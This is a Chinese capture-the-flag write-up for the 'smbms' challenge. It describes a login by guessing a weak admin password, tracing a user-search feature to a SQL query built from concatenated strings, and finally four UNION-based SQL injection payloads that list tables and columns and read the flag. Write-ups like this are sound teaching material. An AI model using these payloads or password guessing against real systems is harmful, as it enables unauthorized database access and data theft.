# smbms

还是应该先看网站的，直接冲源码容易昏头。上网站前先粗略看了一眼源码，真的好多文件，根本看不下去。遂吃一口免费hint，看来第一步是先登录啊？注意到给的sql文件里的密码是weak_auth，提示有弱密码之类的漏洞。瞎蒙几次后1234567成功登录进admin账号

整个超市订单管理系统只有两个功能，用户管理和密码修改，剩下两个点进去是404。我要改密码干啥？故把重心放在用户管理上。用户管理页面的url是`/jsp/user.do`，跑回web.xml，里面显示这个路径对应的类是UserServlet。doGet里有三个功能，直冲query函数，毕竟另外两个函数都和密码相关而之前已经把密码相关内容排除在外了。意外发现作者好心地写了个`重点、难点`的注释，那就是你没跑了。queryUserRole和pageIndex基本没有参与复杂的逻辑，那入手点就是queryName

数据操作用了UserServiceImpl类，其中的getUserList调用了UserDaoImpl类的getUserList。这个函数就很可疑了，用stringbuffer组建sql语句。搜一下这样有没有注入漏洞： https://stackoverflow.com/questions/5147217/is-sql-injection-possible-with-this-query ，答案是有。于是使用sql注入公式。注意语句的闭合，好像不能无脑上注释

```
a%' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14 where '1%'='1
a%' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4,5,6,7,8,9,10,11,12,13,14 where '1%'='1
a%' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='flag' and table_schema=database()),3,4,5,6,7,8,9,10,11,12,13,14 where '1%'='1
a%' union select 1,(select flag from flag),3,4,5,6,7,8,9,10,11,12,13,14 where '1%'='1
```